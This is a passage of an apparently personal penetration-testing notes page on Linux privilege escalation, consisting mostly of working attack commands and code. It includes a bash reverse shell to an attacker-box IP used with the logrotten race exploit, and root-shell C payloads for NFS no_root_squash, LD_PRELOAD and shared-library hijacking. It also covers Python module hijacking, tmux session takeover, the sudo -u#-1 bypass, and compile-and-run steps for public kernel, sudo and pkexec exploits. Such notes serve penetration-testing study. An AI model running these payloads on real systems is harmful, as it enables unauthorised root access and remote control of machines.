<div class="highlight"><pre class="highlight shell"><code><span class="c"># Create our payload:</span>
<span class="nb">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/&lt;attack box IP&gt;/&lt;port&gt; 0&gt;&amp;1'</span> <span class="o">&gt;</span> hacky.sh

<span class="c"># Check option used in logrotate.conf:</span>
<span class="nb">grep</span> <span class="s2">"create</span><span class="se">\|</span><span class="s2">compress"</span> /etc/logrotate.conf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"#"</span>

<span class="c"># Start listener on attack box:</span>
ncat <span class="nt">-lvnp</span> 4444

<span class="c"># Run the exploit with our payload.</span>
<span class="c"># If option used in logrotate.conf is create:</span>
./logrotten <span class="nt">-p</span> hacky.sh &lt;log file path that will rotate&gt;
<span class="c"># Else, if option used is compress:</span>
./logrotten <span class="nt">-p</span> hacky.sh <span class="nt">-c</span> <span class="nt">-s</span> 4 &lt;log file path that will rotate&gt;

<span class="c"># One-liner example to make it work.</span>
<span class="c"># Trigger logrotate to our log by writing to file,</span>
<span class="c"># run logrotten with our payload, and check if log</span>
<span class="c"># has been written to /etc/bash_completion.d/. The</span>
<span class="c"># output *have* to contain a "Done!" string to</span>
<span class="c"># confirm the race condition worked:</span>
<span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"hacky"</span> <span class="o">&gt;&gt;</span> /home/user/backups/access.log<span class="p">;</span> ./logrotten <span class="nt">-p</span> hacky.sh /home/user/backups/access.log<span class="p">;</span> <span class="nb">ls</span> /etc/bash_completion.d/
</code></pre></div>

<h3>Leveraging other techniques</h3>

<p>If <code>tcpdump</code> is present on our target, we might be able to capture network traffic and collect cleartext credentials with <a href="https://github.com/DanMcInerney/net-creds" rel="nofollow">net-creds</a> or <a href="https://github.com/lgandx/PCredz" rel="nofollow">PCredz</a>.</p>

<p>If NFS mounts are present, which we can assess with <code>showmount -e</code>, we can check if any mount is set with <code>no_root_squash</code> in <code>/etc/exports</code> and  leverage them if so. This means creating a binary with the SUID bit set, that will execute a root shell for us:</p>

<div class="highlight"><pre class="highlight c"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="c1">// Simple shell in C.</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><div class="highlight"><pre class="highlight shell"><code><span class="c"># Compile previous C program:</span>
gcc hacky.c <span class="nt">-o</span> hacky

<span class="c"># If the root user mounts the share and</span>
<span class="c"># set the SUID bit on our program, we </span>
<span class="c"># will be able to run it as root from a</span>
<span class="c"># low privileged user:</span>
<span class="nb">sudo </span>mount <span class="nt">-t</span> nfs &lt;target IP&gt;:/tmp /mnt
<span class="nb">cp </span>shell /mnt
<span class="nb">chmod </span>u+s /mnt/shell
</code></pre></div>

<p>If <code>tmux</code> is present on our target, it&#39;s possible to attach our user to a session running as root:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># List tmux sessions on default socket:</span>
tmux list-sessions

<span class="c"># If none are found, maybe sessions exist</span>
<span class="c"># on other socket files:</span>
ps aux | <span class="nb">grep</span> <span class="nt">-i</span> tmux

<span class="c"># If a sessions with root is found, attach</span>
<span class="c"># our user to it:</span>
tmux <span class="nt">-S</span> &lt;socket + session path&gt; attach
</code></pre></div>

<h2>Escalating privileges with internals</h2>

<h3>Leveraging kernel exploits</h3>

<p>Kernel exploits exist for many versions of the Linux kernel. Legacy systems can be numerous and hard to keep track of during an assessment, so this is a path worth exploring. <a href="https://github.com/dirtycow/dirtycow.github.io" rel="nofollow">Dirty COW</a> (CVE-2016-5195) is among the most well-known examples.</p>

<p>The first step is to check the target&#39;s kernel with <code>uname -a</code>, and search online for the related kernel version. It&#39;s also useful to check <code>cat /etc/lsb-release</code> for more info about the distribution in use, which might be compatible or not with found exploits.</p>

<p>Once an exploit is found, compile it directly on the target or on a virtual box using a similar kernel, then run it according to instructions found. Using kernel exploits can lead to system instability, so use caution when running them against production systems.</p>

<h3>Leveraging shared libraries / objects</h3>

<p>Linux programs often use shared libraries, either in the form of static libraries (with the <code>.a</code> file extension) or dynamically linked shared object libraries (with the <code>.so</code> file extension). Static libraries get compiled with the program and become a part of it, so they can&#39;t be altered. But dynamic libraries aren&#39;t, and can be modified externally.</p>

<p>You can view the location of dynamic libraries that a program depends on with <code>ldd</code>, like <code>ldd /bin/ls</code>. </p>

<p>The location of dynamic libraries can be specified in several ways:</p>

<ul>
<li>Including the <code>rpath</code> or <code>rpath-link</code> flags during compilation.</li>
<li>Using the environment variables <code>LD_RUN_PATH</code> or <code>LD_LIBRARY_PATH</code>.</li>
<li>Placing libraries in <code>/lib</code> or <code>/usr/lib</code> default directories.</li>
<li>Specifying another directory in the <code>/etc/ld.so.conf</code> configuration file.</li>
<li>Using the <code>LD_PRELOAD</code> environment variable to load a library before executing a program.</li>
</ul>

<p>The latter is very interesting to us, because it can allow us to escalate our privileges even if a program we are in control of cannot do so on it&#39;s own. We can write the following payload as a &quot;library&quot;:</p>

<div class="highlight"><pre class="highlight c"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">_init</span><span class="p">()</span> <span class="p">{</span>
<span class="n">unsetenv</span><span class="p">(</span><span class="s">"LD_PRELOAD"</span><span class="p">);</span>
<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><div class="highlight"><pre class="highlight shell"><code><span class="c"># And compile it with the following flags:</span>
gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-o</span> root.so root.c <span class="nt">-nostartfiles</span>

<span class="c"># If we have sudo rights to restart apache for example,</span>
<span class="c"># preload our malicious library to drop a root shell</span>
<span class="c"># as well. Specify the absolute path of our payload:</span>
<span class="nb">sudo </span><span class="nv">LD_PRELOAD</span><span class="o">=</span>/tmp/root.so /usr/sbin/apache2 restart
</code></pre></div>

<p>If we see a non-standard library listed in <code>ldd</code> output, this is also a path worth exploring. We can check if such library is loaded from a custom directory with <code>readelf</code>, using <code>readelf -d &lt;binary name&gt; | grep PATH</code>.</p>

<p>If said custom directory is writable with our current user, we can copy shared libraries there as shown with <code>ldd</code>, except for the non-standard one. Running the binary again will fail, because the latter will not be present, but it will output which function is missing:</p>

<div class="highlight"><pre class="highlight plaintext"><code>./dbprogram: symbol lookup error: ./payroll: undefined symbol: dbquery
</code></pre></div>

<p>Which will allow us to make an adequate payload, masquerading as the non-standard library:</p>

<div class="highlight"><pre class="highlight c"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">dbquery</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh -p"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><div class="highlight"><pre class="highlight shell"><code><span class="c"># Then compile our payload as a library as we did earlier.</span>
<span class="c"># Make sure all shared libraries are in the custom directory,</span>
<span class="c"># and this should work:</span>
gcc src.c <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-o</span> /development/libshared.so
</code></pre></div>

<h3>Leveraging Python library</h3>

<p>Python is everywhere, and depending on the modules used by a script, we can also hijack them to gain privilege escalation. We mainly have three types of vulnerabilities we can leverage:</p>

<ul>
<li>Wrong write permissions</li>
<li>Library path</li>
<li>The <code>PYTHONPATH</code> environment variable</li>
</ul>

<p>With wrong write permissions, we might be able to edit a module that a script is importing. If the script has the SUID bit set and our payload is injected into the module, we will gain privilege escalation:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Say a script set with the SUID bit is</span>
<span class="c"># using psutil via its virtual_memory()</span>
<span class="c"># function, and that psutil can somehow</span>
<span class="c"># be edited by our current user. We can</span>
<span class="c"># search for the function in the module:</span>
<span class="nb">grep</span> <span class="nt">-Rin</span> <span class="s2">"def virtual_memory"</span> /usr/local/lib/python3.8/dist-packages/psutil/<span class="k">*</span>

<span class="c"># Check if the __init__ file is writable for us:</span>
<span class="nb">ls</span> <span class="nt">-l</span> /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

<span class="c"># Add the following lines in def virtual_memory():</span>
&lt;SNIP&gt;
import os
os.system<span class="o">(</span><span class="s1">'id'</span><span class="o">)</span>
&lt;SNIP&gt;

<span class="c"># Re-run the script and check if the `id` command</span>
<span class="c"># is returning root. If it does, inject a payload</span>
<span class="c"># in os.system().</span>
</code></pre></div>

<p>With the library path, we leverage the order of priority in which Python searchs and imports modules from. This can be listed with the following command:</p>

<div class="highlight"><pre class="highlight shell"><code>python3 <span class="nt">-c</span> <span class="s1">'import sys; print("\n".join(sys.path))'</span>
</code></pre></div>

<p>One important note is that the last path searched is the one the python script is located in, which might also be used for module hijacking.</p>

<p>If the module imported by the targeted script is located under one of the lower priority paths, and we have write permissions to one of the higher priority paths, we can simply create a similar module that will be searched and imported first, all while carrying our payload:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Check the installation location of imported module:</span>
pip3 show psutil

<span class="c"># Check if other paths with higher priority</span>
<span class="c"># from previous Python commands are writeable</span>
<span class="c"># with our user:</span>
<span class="nb">ls</span> <span class="nt">-la</span> &lt;path&gt;

<span class="c"># If one of them is, write a payload replacing</span>
<span class="c"># the module, like the following (psutil.py):</span>
</code></pre></div><div class="highlight"><pre class="highlight python"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="n">os</span>

<span class="c1"># Function signature must be similar to the original module:
</span><span class="k">def</span> <span class="nf">virtual_memory</span><span class="p">():</span>
    <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div>

<p>If it worked, we can add a real payload in <code>os.system()</code>.</p>

<p>With PYTHONPATH environment variable, we leverage the same replacement of an existing module, by setting the variable that Python uses to search for modules. If <code>sudo -l</code> outputs a permission such as <code>(ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3</code> for our current user, we can set this variable to import our payload anywhere we can write it, such as <code>sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./&lt;target script&gt;</code> to fetch our payload in <code>/tmp</code>.</p>

<h2>Escalating privileges with recent zero days</h2>

<h3>Leveraging sudo vulnerabilities</h3>

<p>Sudo is a ubiquitous program that allows to start processes with the rights of another user. We can list which users or groups are allowed to run which programs under specific privileges, if we have permissions to read the <code>/etc/sudoers</code> file:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="nb">sudo cat</span> /etc/sudoers | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"#"</span> | <span class="nb">sed</span> <span class="nt">-r</span> <span class="s1">'/^\s*$/d'</span>
</code></pre></div>

<p>We can check for sudo&#39;s version on current target with <code>sudo -V | head -n1</code>.</p>

<p>An interesting CVE for sudo is <code>CVE-2021-3156</code>, as it&#39;s been present for 10 years until its discovery. Some, but not all vulnerable versions are:</p>

<ul>
<li>1.8.31 - Ubuntu 20.04</li>
<li>1.8.27 - Debian 10</li>
<li>1.9.2 - Fedora 33</li>
</ul>

<p>A PoC is available <a href="https://github.com/blasty/CVE-2021-3156" rel="nofollow">here</a>. After compiling it with <code>make</code> against our current target or a system that replicates it, all that is left to do is to run <code>./sudo-hax-me-a-sandwich</code>, pick our target by ID and get root. Our target can be found with <code>cat /etc/lsb-release</code>.</p>

<p>Another vulnerability is <code>CVE-2019-14287</code>, that affects all versions below 1.8.28. All that is required is for the user to be allowed to run any command in the <code>sudoers</code> file, which we can check with <code>sudo -l</code>. The command doesn&#39;t have to be allowed as root, just any user.</p>

<p>The trick is then simple: rather than carrying the command to be run with the specified user&#39;s ID in <code>sudoers</code>, we can enter a negative ID of <code>-1</code>, and sudo will instead process the command with ID 0, aka root:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 &lt;command in sudo -l&gt;</span>
</code></pre></div>

<h3>Leveraging polkit</h3>

<p>Polkit (policy kit) is an authorization service on Linux that allows user software to communicate with system components if they are authorized to do so. Actions and policies can be found in <code>/usr/share/polkit-1/actions</code> and rules can be found in <code>/usr/share/polkit-1/rules.d</code>. </p>

<p>Custom rules can also be found in <code>/etc/polkit-1/localauthority/50-local.d</code> with the <code>.pkla</code> extension. Those are local authority rules that set or remove additional permissions for users and groups. Three programs related to polkit are available:</p>

<ul>
<li><code>pkexec</code>, to run a program with the rights of another user, including root.</li>
<li><code>pkaction</code>, to display actions.</li>
<li><code>pkcheck</code>, to check if a process is authorized for a specific action.</li>
</ul>

<p><code>pkexec</code> is especially interesting, as it is functionally similar to <code>sudo</code>. The syntax is <code>pkexec -u &lt;user&gt; &lt;command&gt;</code>.</p>

<p><code>CVE-2021-4034</code>, also known as <code>pwnkit</code>, relies on a memory corruption vulnerability in <code>pkexec</code>. This is also a vulnerability that has been present for more than 10 years before being discovered. A PoC is available <a href="https://github.com/arthepsy/CVE-2021-4034" rel="nofollow">here</a>, and can be compiled with <code>gcc</code> without any additional parameters. As always, we have to make sure to compile it either directly against our target, or against a system that replicates it.</p>

<p>If we don&#39;t have access to <code>gcc</code>, either on the target or a similar system, a Python PoC is also available <a href="https://github.com/Almorabea/pkexec-exploit" rel="nofollow">here</a>.</p>

<h3>Leveraging dirty pipe</h3>

<p><code>CVE-2022-0847</code>, also known as dirty pipe, allows writing to files owned by root, as long as we have read access to them. All kernel versions from <code>5.8</code> to <code>5.17</code> are affected, which we can check on our target with <code>uname -r</code>.</p>

<p>Funnily enough, android phones can also be affected by this. A PoC is available <a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits" rel="nofollow">here</a> and can be compiled with <code>bash compile.sh</code>. This will produce two binaries, two ways of escalating our privileges:</p>

<ul>
<li><code>exploit-1</code> will modify <code>/etc/passwd</code> to give us a prompt with root privileges.</li>
<li><code>exploit-2</code> will execute any SUID binaries with root privileges.</li>
</ul>

<p>We can use <code>find / -perm -4000 2&gt;/dev/null</code> to find SUID binaries present on system, and run it with the exploit with <code>./exploit-2 &lt;binary path&gt;</code>.</p>

<h3>Leveraging netfilter</h3>

<p>Netfilter is a Linux kernel module that provides packet filtering, network address translation and more. Its role is to regulate and control individual network packets. Several CVEs target netfilter, such as <code>CVE-2021-22555</code>, <code>CVE-2022-25636</code> and <code>CVE-2023-32233</code>, and can lead to privilege escalation. They are however very unstable and can break the target system.</p>

<p>Kernel versions from <code>2.6</code> to <code>5.11</code> are vulnerable to <code>CVE-2021-22555</code>. A PoC can be downloaded <a href="https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c" rel="nofollow">here</a>. Use <code>gcc -m32 -static exploit.c -o exploit</code> to compile it against the target, and run it.</p>

<p>Kernel versions from <code>5.4</code> to <code>5.6.10</code> are vulnerable to <code>CVE-2022-25636</code>. A detail article about its discovery can be found <a href="https://nickgregory.me/post/2022/03/12/cve-2022-25636/" rel="nofollow">here</a>, and a PoC is available <a href="https://github.com/Bonfee/CVE-2022-25636" rel="nofollow">here</a>. Be careful with this exploit as it can corrupt the kernel, and a reboot is required. Compile the exploit against the target by running <code>make</code> in the repo, and run it.</p>

<p>Kernel versions up to <code>6.3.1</code> are vulnerable to <code>CVE-2023-32233</code>. A PoC is available <a href="https://github.com/Liuk3r/CVE-2023-32233" rel="nofollow">here</a> and can be compiled against the target with <code>gcc -Wall -o exploit exploit.c -lmnl -lnftnl</code>.</p>

<h2>References</h2>

<ul>
<li><a href="https://0xffsec.com/handbook/shells/restricted-shells/" rel="nofollow">https://0xffsec.com/handbook/shells/restricted-shells/</a></li>
<li><a href="https://gtfobins.github.io/" rel="nofollow">https://gtfobins.github.io/</a></li>
<li><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities" rel="nofollow">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities</a></li>
<li><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/abusing-docker-socket-for-privilege-escalation" rel="nofollow">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/abusing-docker-socket-for-privilege-escalation</a></li>
<li><a href="https://www.youtube.com/watch?v=RBtN5939m3g&t=4350s" rel="nofollow">https://www.youtube.com/watch?v=RBtN5939m3g&amp;t=4350s</a></li>
<li><a href="https://redfoxsec.com/blog/terminal-multiplexing-hijacking-tmux-sessions/" rel="nofollow">https://redfoxsec.com/blog/terminal-multiplexing-hijacking-tmux-sessions/</a></li>
<li><a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/" rel="nofollow">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/</a></li>
<li><a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/" rel="nofollow">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/</a></li>
</ul>

    
    </main>
    <footer id="footer">
      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
      <div class="footer-section"></div>
    </footer>
  </body>
</html>

